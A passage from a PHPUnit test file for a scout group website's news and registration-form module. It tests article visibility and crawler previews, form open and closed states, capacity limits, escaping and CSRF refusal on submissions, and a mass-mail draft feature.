        $financeAccount->method('getConfiguredAccounts')->willReturn([
            ['id' => 42, 'name' => 'Compte Meute A', 'iban' => null, 'holder_name' => null, 'section_id' => $sectionId],
        ]);
        $financeAccount->expects($this->once())->method('getDefaultAccountForSection')->with($sectionId)->willReturn(42);

        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir()),
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService,
            new \Modules\News\Service\TicketService($this->responseRepository), $financeAccount
        );

        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $response = $controller->create(new Request('GET', '/news/create', [], [], [], []), []);

        $this->assertMatchesRegularExpression('/<option value="42"[^>]*selected[^>]*>Compte Meute A<\/option>/', $response->getBody());
    }

    public function testShowRendersArticleDetailWithoutForm(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Titre article', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Titre article', $response->getBody());
        // No real input field (not even a saved form) — nothing to submit,
        // so the submission mechanics must not render (usability review).
        $this->assertStringNotContainsString('Envoyer', $response->getBody());
        $this->assertStringNotContainsString('contact_email', $response->getBody());
    }

    /**
     * The breadcrumb was previously empty on this page (module.json's
     * /news/{id} route declared no `breadcrumb` at all) — now declared,
     * with `breadcrumb_current` set to the real article title rather than
     * a static, uninformative label (same pattern as MemberController).
     */
    public function testShowSetsBreadcrumbCurrentToTheArticleTitle(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => 'Actualité', 'parents' => ['Notre unité']]);
        $this->twig->addGlobal('menus', [['id' => 'notre_unite', 'label' => 'Notre unité']]);

        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp d\'été 2026', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertStringContainsString('aria-current="page"', $response->getBody());
        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Camp d&#039;été 2026\s*</',
            $response->getBody()
        );
    }

    public function testShowMigratesLegacyBodyHtmlIntoContentWhenArticlePredatesTheMandatoryForm(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Ancien article', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        // Simulates an article saved before the form became mandatory —
        // content lived in the generic editable-content store, no
        // news_forms row exists at all.
        $this->editableContentService->set(ArticleService::bodyContentKey($id), '<p>Contenu historique de l\'article.</p>', 'rich_text', $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Contenu historique de l\'article.', $response->getBody());
        $this->assertStringNotContainsString('Envoyer', $response->getBody());
    }

    public function testEditEditorPageMigratesLegacyBodyHtmlIntoADefaultTextField(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Ancien article', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $this->editableContentService->set(ArticleService::bodyContentKey($id), '<p>Contenu historique.</p>', 'rich_text', $this->chiefAccountId);

        $response = $this->newsController->edit(new Request('GET', '/news/' . $id . '/gerer', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Contenu historique.', $response->getBody());
    }

    public function testCreateEditorPageHasNoAddFormCheckboxAndFieldsBoxIsCalledArticle(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);
        $body = $response->getBody();

        // Only the default "bloc de texte" exists — the fields box reads
        // "Article" (JS renames it to "Formulaire" once a real input field
        // is added), and there's no "Accès au formulaire" control anymore.
        $this->assertStringContainsString('id="news-form-box-heading">Article<', $body);
        $this->assertStringNotContainsString('id="has_form"', $body);
        $this->assertStringNotContainsString('Ajouter un formulaire', $body);
        $this->assertStringNotContainsString('Accès au formulaire', $body);
        $this->assertStringNotContainsString('name="form_access"', $body);
    }

    public function testShowRendersOpenGraphAndTwitterCardMetaTagsWithAbsoluteImageUrl(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp d\'ete 2026', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $this->articleRepository->update($id, 'Camp d\'ete 2026', Article::VISIBILITY_PUBLIC, false, null, null, 'Un super camp cet ete !', 55);
        $this->articleRepository->setShortUrlCode($id, 'abc123');
        $this->settingService->register('base_url', 'https://example.test', 'text', 'label', 'desc');

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
        $body = $response->getBody();

        $this->assertStringContainsString('property="og:title" content="Camp d', $body);
        $this->assertStringContainsString('property="og:description" content="Un super camp cet ete !"', $body);
        $this->assertStringContainsString('property="og:url" content="https://example.test/s/abc123"', $body);
        $this->assertStringContainsString('property="og:image" content="https://example.test/files/55"', $body);
        $this->assertStringContainsString('name="twitter:card" content="summary_large_image"', $body);
    }

    /**
     * The visibility check is a server-side boundary, not a listing
     * filter (SECURITY.md §3): hiding the article from /news does not
     * protect it, refusing its CONTENT at /news/{id} does.
     *
     * Since issue #211 the refusal is a preview page rather than a bare
     * 403 — a crawler does not read a 403's body, so og: tags behind one
     * reach nobody. The boundary is unchanged and this is what pins it:
     * an anonymous caller gets the title, the summary and the cover, and
     * not one word of the body or of the form.
     */
    public function testAnonymousGetsThePreviewOfAnIdentifiedArticleAndNoneOfItsContent(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId));
        $this->articleRepository->update($id, 'Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, 'Un resume public.', 55);
        $this->editableContentService->set(ArticleService::bodyContentKey($id), '<p>Le corps secret du camp.</p>', 'rich_text', $this->chiefAccountId);
        $this->formRepository->create($id, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
        $body = $response->getBody();

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Un resume public.', $body);
        $this->assertStringContainsString('name="robots" content="noindex"', $body);

        $this->assertStringNotContainsString('Le corps secret du camp.', $body);
        $this->assertStringNotContainsString('news-form', $body);
        $this->assertStringNotContainsString('contact_email', $body);
    }

    /**
     * The half of the feature the preview exists for, and the one a test
     * signing in first cannot reach: the crawler that renders a link
     * posted to a group of animateurs holds no session, so the og: tags
     * have to survive an ANONYMOUS request or the whole decision ships
     * its cost — a public cover image — and none of its effect.
     */
    public function testAnAnonymousCrawlerReceivesTheOpenGraphTagsOfAnIdentifiedArticle(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp reserve', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId));
        $this->articleRepository->update($id, 'Camp reserve', Article::VISIBILITY_IDENTIFIED, false, null, null, 'Reserve aux membres.', 55);
        $this->articleRepository->setShortUrlCode($id, 'abc123');
        $this->settingService->register('base_url', 'https://example.test', 'text', 'label', 'desc');

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
        $body = $response->getBody();

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('property="og:title" content="Camp reserve"', $body);
        $this->assertStringContainsString('property="og:description" content="Reserve aux membres."', $body);
        $this->assertStringContainsString('property="og:url" content="https://example.test/s/abc123"', $body);
        $this->assertStringContainsString('property="og:image" content="https://example.test/files/55"', $body);
        $this->assertStringContainsString('name="twitter:card" content="summary_large_image"', $body);
    }

    /**
     * And a staff-only article keeps the bare refusal: no preview means
     * nothing to serve an anonymous caller, so nothing is.
     */
    public function testAnonymousStillGetsAFlat403OnAChiefArticle(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Weekend de staff', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId));
        $this->articleRepository->update($id, 'Weekend de staff', Article::VISIBILITY_CHIEF, false, null, null, 'Un secret de famille.', 55);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
        $this->assertStringNotContainsString('Un secret de famille.', $response->getBody());
    }

    public function testShowRendersIdentifiedArticleForASignedInMember(): void
    {
        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Membres', $response->getBody());
    }

    public function testPublicListHidesIdentifiedArticleFromAnAnonymousVisitorAndShowsItToAMember(): void
    {
        NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Reserve aux membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId));

        $anonymous = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);
        $this->assertStringNotContainsString('Reserve aux membres', $anonymous->getBody());

        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');
        $member = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);
        $this->assertStringContainsString('Reserve aux membres', $member->getBody());
    }

    /**
     * Issue #211: a « Membres connectés » article IS posted to a group of
     * animateurs, and the crawler rendering that preview never signs in —
     * so its title, summary and cover image are emitted like any other
     * article's. Only the body stays behind the 403.
     *
     * The preview and the indexing are two different questions and this
     * test pins both: og: yes, noindex still yes. A search engine
     * offering the page to everybody who searches is not the same act as
     * a preview of a link somebody chose to post.
     */
    public function testIdentifiedArticleExposesItsPreviewButStaysUnindexed(): void
    {
        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp reserve', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId));
        $this->articleRepository->update($id, 'Camp reserve', Article::VISIBILITY_IDENTIFIED, false, null, null, 'Reserve aux membres.', 55);
        $this->settingService->register('base_url', 'https://example.test', 'text', 'label', 'desc');

        $body = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id])->getBody();

        $this->assertStringContainsString('property="og:title" content="Camp reserve"', $body);
        $this->assertStringContainsString('property="og:description" content="Reserve aux membres."', $body);
        $this->assertStringContainsString('property="og:image" content="https://example.test/files/55"', $body);
        $this->assertStringContainsString('name="robots" content="noindex"', $body);
    }

    /**
     * The other side of the same decision: a staff-only article is not
     * something anybody pastes into a group, so it emits no preview at
     * all — the widening stops at « Membres connectés ».
     */
    public function testChiefArticleExposesNoOpenGraphMetadataEvenToAReaderWhoMaySeeIt(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Weekend de staff', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId));
        $this->articleRepository->update($id, 'Weekend de staff', Article::VISIBILITY_CHIEF, false, null, null, 'Un secret de famille.', 55);
        $this->settingService->register('base_url', 'https://example.test', 'text', 'label', 'desc');

        $body = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id])->getBody();

        $this->assertStringNotContainsString('property="og:', $body);
        $this->assertStringNotContainsString('name="twitter:', $body);
        $this->assertStringContainsString('name="robots" content="noindex"', $body);
    }

    public function testShowReturns403ForChiefArticleWhenPublic(): void
    {
        $id = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Réservé', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId));

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
    }

    /**
     * Issue #925, through the real route: a form closed by hand whose
     * closing date is still ahead must not announce that date as past, and
     * must not offer the form.
     */
    public function testAManuallyClosedFormDoesNotAnnounceItsFutureClosingDateAsPast(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $closesAt = (new \DateTimeImmutable('+6 months'))->format('Y-m-d');
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, $closesAt, true, 'chief', null, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $body = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId])->getBody();

        $this->assertStringContainsString('Ce formulaire est fermé et n\'accepte plus de réponses.', $body);
        $this->assertStringNotContainsString('a été fermé', $body);
        $this->assertStringNotContainsString('id="news-form"', $body, 'a closed form is not offered');
    }

    public function testAFormNotYetOpenAnnouncesItsOpeningOnTheArticlePage(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $opensAt = new \DateTimeImmutable('+10 days');
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, $opensAt->format('Y-m-d'), null, false, 'chief', null, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $body = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId])->getBody();

        $this->assertStringContainsString('Ce formulaire n\'est pas encore ouvert.', $body);
        $this->assertStringNotContainsString('n\'accepte plus de réponses', $body);
        $this->assertStringNotContainsString('id="news-form"', $body);
    }

    public function testShowRendersOpenFormAndAcceptsASubmission(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $showResponse = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId]);
        $this->assertStringContainsString('Envoyer', $showResponse->getBody());
        $this->assertStringContainsString('field_' . $fieldId, $showResponse->getBody());

        $csrfToken = CsrfGuard::generateToken();
        $submitRequest = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alice',
        ], [], []);

        $submitResponse = $this->formController->submit($submitRequest, ['id' => (string) $articleId]);

        // Post/Redirect/Get since #251: the submission answers a redirect,
        // and the confirmation is its own GET — so a refresh re-reads a
        // page instead of re-sending the form.
        $this->assertSame(302, $submitResponse->getStatusCode());
        $this->assertSame(
            '/news/' . $articleId . '/form/confirmation',
            $submitResponse->getHeaders()['Location'] ?? null
        );

        $confirmationResponse = $this->formController->confirmation(
            new Request('GET', '/news/' . $articleId . '/form/confirmation', [], [], [], []),
            ['id' => (string) $articleId]
        );
        $this->assertSame(200, $confirmationResponse->getStatusCode());
        $this->assertStringContainsString('Votre réponse a été enregistrée', $confirmationResponse->getBody());
        $this->assertSame(1, (int) $this->pdo->query('SELECT COUNT(*) FROM news_form_responses')->fetchColumn());
    }

    /**
     * A capped number field must render `max="2"` — a real HTML number, not
     * a string that merely looks like one.
     *
     * The attribute used to be built as a Twig expression
     * (`'max="' ~ remaining_capacity ~ '"'`), which autoescaping turned
     * into `max=&quot;2&quot;`; an HTML parser reads that back as an
     * UNQUOTED value of `"2"`, so the browser had a max it could not
     * interpret and enforced no cap at all. The regression is invisible to
     * an assertion on the rendered text ("Il reste 2 places" was always
     * right) and was found by driving the form in a real browser
     * (tests/e2e/specs/news-form-payment.spec.js).
     */
    public function testCappedNumberFieldRendersARealMaxAttribute(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places', true, null, null, 2, null, null);

        $body = $this->newsController->show(
            new Request('GET', '/news/' . $articleId, [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('max="2"', $body);
        $this->assertStringNotContainsString('max=&quot;', $body);
        $this->assertStringContainsString('Il reste 2 places', $body);
    }

    /**
     * When a required capped field's quota is exhausted, the page must
     * keep the field's label but replace the greyed-out input with a
     * "Complet" notice — a disabled input is never submitted by the
     * browser, so a disabled+required one made the WHOLE form
     * unsubmittable for everyone (the server saw the required answer as
     * empty and refused). The remaining fields must still submit fine.
     */
    public function testFullRequiredNumberFieldRendersAsCompletAndTheFormStillSubmits(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $placesId = $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places bus', true, null, null, 2, null, null);
        $nameId = $this->fieldRepository->create($formId, 1, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'x@test.com', [$placesId => '2'], null, null);

        $body = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId])->getBody();

        $this->assertStringContainsString('Places bus', $body, 'the label must stay visible');
        $this->assertStringContainsString("Complet — cette option n'est plus proposée.", $body);
        $this->assertStringNotContainsString('name="field_' . $placesId . '"', $body, 'no disabled+required input for a full field');

        $submitRequest = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'parent@test.com',
            'field_' . $nameId => 'Alice',
        ], [], []);

        $this->assertSame(302, $this->formController->submit($submitRequest, ['id' => (string) $articleId])->getStatusCode());
        $confirmation = $this->formController->confirmation(
            new Request('GET', '/news/' . $articleId . '/form/confirmation', [], [], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(200, $confirmation->getStatusCode());
        $this->assertStringContainsString('Votre réponse a été enregistrée', $confirmation->getBody());
    }

    /**
     * A rejected submission re-renders the form — and must hand the
     * visitor back everything they typed (rerenderFormWithError), not a
     * blank form: text values (escaped), checked checkboxes, and the
     * posted contact email.
     */
    public function testSubmitErrorRedisplayKeepsThePostedValues(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $nameId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $daysId = $this->fieldRepository->create($formId, 1, FormField::TYPE_CHECKBOX, 'Jours', false, FormField::OPTIONS_SOURCE_MANUAL, "Lundi\nMardi", null, null, null);
        $emailId = $this->fieldRepository->create($formId, 2, FormField::TYPE_EMAIL, 'Email parent', true, null, null, null, null, null);

        $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'famille@test.com',
            'field_' . $nameId => 'Bob <Marchand>',
            'field_' . $daysId => ['Lundi'],
            // Invalid on the server → NewsException → error re-render.
            'field_' . $emailId => 'pas-un-email',
        ], [], []);

        $response = $this->formController->submit($request, ['id' => (string) $articleId]);
        $body = $response->getBody();

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('doit être une adresse email valide', $body);
        $this->assertStringContainsString('value="Bob &lt;Marchand&gt;"', $body, 'text answer kept, HTML-escaped');
        $this->assertMatchesRegularExpression('/value="Lundi"\s+checked/', $body, 'checkbox answer kept');
        $this->assertDoesNotMatchRegularExpression('/value="Mardi"\s+checked/', $body, 'unchecked option stays unchecked');
        $this->assertStringContainsString('value="pas-un-email"', $body, 'the offending value is shown for correction');
        $this->assertStringContainsString('name="contact_email" value="famille@test.com"', $body);
    }

    public function testSubmitRejectsClosedFormAndRedisplaysArticle(): void
    {
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', null, null);
        // A form with zero real input fields has nothing to submit, so the
        // "closed" messaging only renders once there's at least one.
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $csrfToken = CsrfGuard::generateToken();
        $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
        ], [], []);

        $response = $this->formController->submit($request, ['id' => (string) $articleId]);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('fermé', $response->getBody());
    }

    /**
     * The error re-render (@news/detail.html.twig, same template show()
     * itself renders) must carry the same breadcrumb_current as a normal
     * GET /news/{id} — a validation error must not silently drop it.
     */
    public function testSubmitErrorRedisplayKeepsBreadcrumbCurrentAsTheArticleTitle(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => 'Actualité', 'parents' => ['Notre unité']]);
        $this->twig->addGlobal('menus', [['id' => 'notre_unite', 'label' => 'Notre unité']]);

        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Sortie Ardennes', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', null, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'parent@test.com',
        ], [], []);

        $response = $this->formController->submit($request, ['id' => (string) $articleId]);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Sortie Ardennes\s*</',
            $response->getBody()
        );
    }

    public function testResponsesPageRendersForChiefAndListsSubmission(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        $response = $this->formController->responses(new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('parent@test.com', $response->getBody());
    }

    public function testResponsesPageRejectsRoleBelowResponseRoleMin(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'identified');
        $articleId = NewsTestHelper::publish($this->pdo, $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId));
        $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', null, null);

        $response = $this->formController->responses(new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(403, $response->getStatusCode());
    }

    // --- IT-06: "Écrire aux répondants" ---
    //
    // The route itself is `chief` while this page is `intendant`, and the
    // guard is what enforces that (NewsRbacTest covers it). What is left
    // to this file is the controller's own two refusals — the module being
    // absent, and the CSRF token — plus the shape of what it hands over.

    public function testTheMailDraftButtonIsAbsentWithoutTheMassMailModule(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $body = $this->formController->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        // $this->formController is built with no draft provider, which is
        // exactly what the composition root passes when mass_mail is off.
        // Matched on the action URL rather than the label: the labels are
        // deliberately short (« Exporter », « Écrire ») so the row stops
        // overflowing a 375-pixel screen, and « Écrire » alone is a
        // substring of too much prose to assert on.
        $this->assertStringNotContainsString('/form/responses/mail-draft', $body);
        $this->assertStringContainsString('/form/responses/export', $body, 'the rest of the page is untouched');
    }

    public function testCreatingAMailDraftIsNotFoundWithoutTheMassMailModule(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $token = CsrfGuard::generateToken();

        $response = $this->formController->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], ['_csrf_token' => $token], [], []),
            ['id' => (string) $articleId]
        );

        // Not a 500 and not an error page: the feature simply is not
        // offered, so the route has nothing to reach.
        $this->assertSame(404, $response->getStatusCode());
    }

    public function testTheMailDraftButtonAppearsWithTheModuleAndAChiefRole(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $body = $this->formControllerWithMassMail()->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('/form/responses/mail-draft', $body);
    }

    public function testTheMailDraftButtonIsHiddenFromAnIntendant(): void
    {
        // The page opens at `intendant`, the mail merge starts at `chief`.
        // The button is hidden for the gap — presentation only; the route's
        // own floor is the boundary.
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'intendant');
        $articleId = $this->articleWithOneResponse('intendant');

        $body = $this->formControllerWithMassMail()->responses(
            new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringNotContainsString('/form/responses/mail-draft', $body);
    }

    public function testCreatingAMailDraftHandsOverTheExportsColumnsAndRedirects(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $token = CsrfGuard::generateToken();

        $captured = [];
        $draft = $this->recordingDraftProvider($captured);

        $response = $this->formControllerWithMassMail($draft)->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], ['_csrf_token' => $token], [], []),
            ['id' => (string) $articleId]
        );

        $this->assertSame(302, $response->getStatusCode());
        $this->assertSame('/mass-mail/7', $response->getHeaders()['Location'] ?? null);

        // Same first column and same field order as the XLSX export, read
        // from the same isNonInput() rule rather than restated.
        $this->assertSame(['Contact', 'Nom'], $captured['columns']);
        $this->assertSame([
            ['email' => 'parent@test.com', 'values' => ['Contact' => 'parent@test.com', 'Nom' => 'Alice']],
        ], $captured['rows']);
    }

    public function testCreatingAMailDraftRefusesAnInvalidCsrfToken(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();

        $response = $this->formControllerWithMassMail()->createMailDraft(
            new Request('POST', '/news/' . $articleId . '/form/responses/mail-draft', [], ['_csrf_token' => 'wrong'], [], []),
            ['id' => (string) $articleId]
        );

        // guardCsrf() sends the user back with a flash rather than erroring,
        // so the status is a redirect either way — WHERE it goes is the
        // assertion that distinguishes a refusal from a success.
        $this->assertSame(
            '/news/' . $articleId . '/form/responses',
            $response->getHeaders()['Location'] ?? null,
            'a bad token must land back on the responses page, never in the composer'
        );
    }

    /**
     * The mass-mail module refusing the draft — here with the sentence it
     * really says when no row can reach anybody — sends the chief back to
     * the responses with that sentence, and journals no draft that was
     * never made.
     */
    public function testAMailDraftTheMassMailModuleRefusesSendsTheChiefBackWithItsReason(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleWithOneResponse();
        $draft = $this->createStub(\Modules\MassMail\Api\MassMailDraftInterface::class);
        $draft->method('createMergeDraft')->willThrowException(new \Modules\MassMail\Api\MassMailException(
            'Personne à qui écrire : aucune ligne ne porte un membre ou une adresse.'
        ));
        $this->journalService->expects($this->never())->method('log');

